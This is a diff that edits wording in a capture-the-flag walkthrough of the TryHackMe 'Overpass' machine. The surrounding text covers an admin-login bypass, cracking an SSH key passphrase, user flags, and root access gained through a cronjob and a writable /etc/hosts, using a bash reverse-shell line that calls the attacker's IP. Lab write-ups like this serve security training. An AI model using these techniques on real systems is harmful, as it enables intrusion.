@@ -24,7 +24,7 @@ PORT   STATE SERVICE VERSION
 
 # Web
 
-SSH Service requiers creds, so let's head to the webpage. I ran `gobuster` and found a few directories:
+SSH service requiers creds, so let's head to the webpage. I ran `gobuster` and found a few directories:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Overpass]
@@ -55,7 +55,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /index.html           (Status: 301) [Size: 0] [--> ./]
 ~~~
 
-After taking a look at them, I found an interesting js file in `/admin` which is a login page for admins. You can find it in `Debugger` section in inspect mode. Let's take a look at the last function in `login.js`.
+After taking a look at them, I found an interesting js file in `/admin` directory which is a login page for admins. You can find the file in `Debugger` section in inspect mode. Let's take a look at the last function in `login.js`.
 
 ```js
 async function login() {
@@ -82,7 +82,7 @@ This part of the code is vulnerable because after sending the client's inputs to
 
 To do so, follow the following steps:
 
-First navigate to `/admin` and then start `burpsuite`. Then fill the inputs randomly and after intercepting the request, right click and choose `Do intercept` and then choose `Request to this request`. Now forward the request and now we can change the response. Now replcae the last line with `"location: /admin"` and forward the response.
+First navigate to `/admin` and then start `burpsuite`. Then fill the inputs with something random and after intercepting the request, right click and choose `Do intercept` and then choose `Request to this request`. Now forward the request and now we can change the response. Now replcae the last line with `"location: /admin"` and forward the response.
 
 <p align="center"><img src="./files/burp1.png"></p>
 
@@ -90,11 +90,11 @@ Now refresh the page and we're in.
 
 # Connecting to SSH
 
-Right after logging in, we face a SSH private key and a message to user `james`.
+Right after logging in, we face a SSH private key and a message for user `james`.
 
 <p align="center"><img src="./files/PK.png"></p>
 
-We need to crack the password of the private key in order to login. I used an additional tool called `ssh2john` which changes the format of the key to a format which is crackable for `john`. Then cracked its password using `john` and `rockyou` wordlist.
+We need to crack the password of the private key in order to login. I used an additional tool called `ssh2john` which changes the format of the SSH private key to a format which is crackable for `john`. Then cracked its password using `john` and `rockyou` wordlist.
 
 ~~~
 ┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Overpass/files]
@@ -154,7 +154,7 @@ uid=1001(james) gid=1001(james) groups=1001(james)
 
 ## User Flag
 
-We are logged in as james and the user flag is in his home directory:
+We are logged in as user **"james"** and the user flag is in his home directory:
 
 ~~~
 james@overpass-prod:~$ ls
@@ -165,9 +165,9 @@ thm{65c1aaf000506e56996822c6281e6bf7}
 
 User flag: `thm{65c1aaf000506e56996822c6281e6bf7}`
 
-## Going Root
+# Going Root
 
-Now we need to gain root access in order to get the root flag. We can't run `sudo -l` to see our permissions, so I started checking the files that might be useful. I found a cronjob in /etc/crontab:
+Now we need to go root access in order to gain the root flag. We can't run `sudo -l` to see our permissions, so I started checking the files that might be useful. I found a cronjob in `/etc/crontab`:
 
 ~~~
 james@overpass-prod:/tmp$ cat /etc/crontab 
@@ -196,7 +196,7 @@ james@overpass-prod:/tmp$ ls -la /etc/hosts
 -rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
 ~~~
 
-We can use this to change the IP of the virtual host to our IP and then create the same directory tree and replace the final script with a bash reverse shell and because the cronjob is ran by root, we will gain a root shell.
+We can use this permission to change the IP of the virtual host to our IP and then create the same directory tree and replace the final script with a bash reverse shell and because the cronjob is being ran by root, we will gain a root shell.
 
 First change the IP in front of "overpass.thm" in `/etc/hosts` to yours:
 
@@ -222,7 +222,7 @@ Then create the same directories on your machine:
 └─$ echo "bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1" > buildscript.sh
 ~~~
 
-Now we start a server where the directories start (www in my case), so when the target machine tries to connect to the virtual host, it can connect to us and run our script:
+Now we start a server where the directories start (www in my case), so when the target machine tries to connect to the virtual host, it connects to us and runs our script:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Overpass/www]
